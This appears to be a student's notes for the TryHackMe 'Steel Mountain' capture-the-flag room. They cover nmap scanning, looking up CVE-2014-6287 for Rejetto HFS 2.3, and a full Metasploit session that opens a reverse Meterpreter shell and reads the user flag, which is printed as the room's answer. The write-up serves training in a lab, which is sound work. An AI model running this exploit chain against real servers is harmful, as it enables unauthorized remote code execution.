# Advanced Exploitation

- Vulnerability Scanning
- Handling Public Exploits
- Password Cracking
- Port Redirection

## Steel Mountain
> https://tryhackme.com/room/steelmountain

MYIP=10.10.93.153
TARGET=10.10.170.98

nmap -sCV --min-rate 8888 -T4 -p- $TARGET
```nmap
Nmap scan report for ip-10-10-166-27.eu-west-1.compute.internal (10.10.166.27)
  Host is up, received arp-response (0.0017s latency).
  Scanned at 2023-02-25 14:27:22 GMT for 94s
  Not shown: 64434 closed ports, 1086 filtered ports
  Reason: 64434 resets and 1086 no-responses
  PORT      STATE SERVICE      REASON          VERSION
  80/tcp    open  http         syn-ack ttl 128 Microsoft IIS httpd 8.5
  135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds syn-ack ttl 128 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
  3389/tcp  open  ssl          syn-ack ttl 128 Microsoft SChannel TLS
  5985/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  8080/tcp  open  http         syn-ack ttl 128 HttpFileServer httpd 2.3
  47001/tcp open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49155/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49156/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49169/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49170/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
```

### Task1 
Who is the employee of the month?
> Bill Harper
```
go to port 80
save image, reverse google search
```

### Task3
Scan the machine with nmap. What is the other port running a web server on?
> 8080

Take a look at the other web server. What file server is running?
> Rejetto HTTP File Server
```
8080/tcp  open     http               syn-ack ttl 128 HttpFileServer httpd 2.3
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3

Go $TARGET:8080 on browser, view page source
<fieldset id='serverinfo'>
		<legend><img src="/~img0"> Server information</legend>
		<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
		<br />Server time: 4/1/2023 10:11:13 PM
		<br />Server uptime: 00:27:45
	</fieldset>
```
What is the CVE number to exploit this file server?
> 2014-6287

```
searchsploit "Rejetto 2.3"
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
[01;31m[KRejetto[m[K HTTP File Server (HFS) 2.2/[01;31m[K2.3[m[K - Arbitrary File Upload                      | multiple/remote/30850.txt
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[K.x - Remote Command Execution (1)                 | windows/remote/34668.txt
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[K.x - Remote Command Execution (2)                 | windows/remote/39161.py
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[Ka/[01;31m[K2.3[m[Kb/[01;31m[K2.3[m[Kc - Remote Command Execution            | windows/webapps/34852.txt
[01;31m[KRejetto[m[K HttpFileServer [01;31m[K2.3[m[K.x - Remote Command Execution (3)                         | windows/webapps/49125.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


findsploit 2.3
___ _           _           _       _ _
/ __(_)_ __   __| |___ _ __ | | ___ (_) |_
/ _\ | | '_ \ / _` / __| '_ \| |/ _ \| | __|
/ /   | | | | | (_| \__ \ |_) | | (_) | | |_
\/    |_|_| |_|\__,_|___/ .__/|_|\___/|_|\__|
|_|

+ -- --=[ findsploit v2.0 by @xer0dayz
+ -- --=[ https://sn1persecurity.com

+ -- --=[ SEARCHING:  rejetto 2.3

+ -- --=[ NMAP SCRIPTS


+ -- --=[ METASPLOIT EXPLOIT S


+ -- --=[ EXPLOITDB EXPLOITS

bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
------------------------------------------------------------------------------------ ---------------------------------
Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                      | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                 | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                 | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution            | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                         | windows/webapps/49125.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

https://www.exploit-db.com/search?q=rejetto 2.3++
https://www.google.ca/search?q=rejetto 2.3%20%20+exploit
https://www.google.ca/search?q=rejetto 2.3%20%20+exploit+site:www.securityfocus.com
https://www.google.ca/search?q=rejetto 2.3%20%20+site:0day.today
https://www.google.ca/search?q=rejetto 2.3%20%20+site:www.security-database.com
https://www.google.ca/search?q=rejetto 2.3%20%20+site:packetstormsecurity.com
https://exploits.shodan.io/?q=rejetto 2.3++
https://vulners.com/search?query=rejetto 2.3++


https://www.exploit-db.com/exploits/34926
CVE:
2014-6287

```

Use Metasploit to get an initial shell. What is the user flag?
> b04763b6fcf51fcd7c13abc7db4fd365
```
â””â”€# msfconsole -q
msf6 > search cve-2014-6287

Matching Modules
================

#  Name                                   Disclosure Date  Rank       Check  Description
-  ----                                   ---------------  ----       -----  -----------
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > info

Name: Rejetto HttpFileServer Remote Command Execution
Module: exploit/windows/http/rejetto_hfs_exec
Platform: Windows
Arch:
Privileged: No
License: Metasploit Framework License (BSD)
Rank: Excellent
Disclosed: 2014-09-11

Provided by:
Daniele Linguaglossa <danielelinguaglossa@gmail.com>
Muhamad Fadzil Ramli <mind1355@gmail.com>

Available targets:
Id  Name
--  ----
0   Automatic

Check supported:
Yes

Basic options:
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
HTTPDELAY  10               no        Seconds to wait before terminating web server
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
  Using-Metasploit
RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on
  the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The path of the web application
URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

  Payload information:
  Avoid: 3 characters

  Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command
  execution attack due to a poor regex in the file ParserLib.pas. This
  module exploits the HFS scripting commands by using '%00' to bypass
  the filtering. This module has been tested successfully on HFS 2.3b
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

  References:
https://nvd.nist.gov/vuln/detail/CVE-2014-6287
OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.170.98
RHOSTS => 10.10.179.98
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080

msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.93.153:4444
[*] Using URL: http://10.10.93.153:8080/5WsgZ5tsviHoH
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /5WsgZ5tsviHoH
[*] Sending stage (175686 bytes) to 10.10.170.98
[!] Tried to delete %TEMP%\SlKJUoUF.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.93.153:4444 -> 10.10.170.98:49261) at 2023-04-02 05:43:04 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows


shell 

c:\Users\bill>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill

 09/27/2019  09:09 AM    <DIR>          .
 09/27/2019  09:09 AM    <DIR>          ..
 09/26/2019  11:29 PM    <DIR>          .groovy
 09/27/2019  04:07 AM    <DIR>          Contacts
 09/27/2019  09:08 AM    <DIR>          Desktop
 09/27/2019  04:07 AM    <DIR>          Documents
 09/27/2019  04:07 AM    <DIR>          Downloads
 09/27/2019  04:07 AM    <DIR>          Favorites
 09/27/2019  04:07 AM    <DIR>          Links
 09/27/2019  04:07 AM    <DIR>          Music
 09/27/2019  04:07 AM    <DIR>          Pictures
 09/27/2019  04:07 AM    <DIR>          Saved Games
 09/27/2019  04:07 AM    <DIR>          Searches
 09/27/2019  04:07 AM    <DIR>          Videos
 0 File(s)              0 bytes
 14 Dir(s)  44,170,067,968 bytes free


 c:\Users\bill>cd Desktop
 cd Desktop

 c:\Users\bill\Desktop>dir
 dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill\Desktop

 09/27/2019  09:08 AM    <DIR>          .
 09/27/2019  09:08 AM    <DIR>          ..
 09/27/2019  05:42 AM                70 user.txt
 1 File(s)             70 bytes
 2 Dir(s)  44,170,067,968 bytes free

 c:\Users\bill\Desktop>type user.txt
 type user.txt
 b04763b6fcf51fcd7c13abc7db4fd365
```




## Alfred

## HackPark

## GameZone

## Skynet

## Daily Bugle

## Overpass 2 - Hacked

## Relevant

## Internal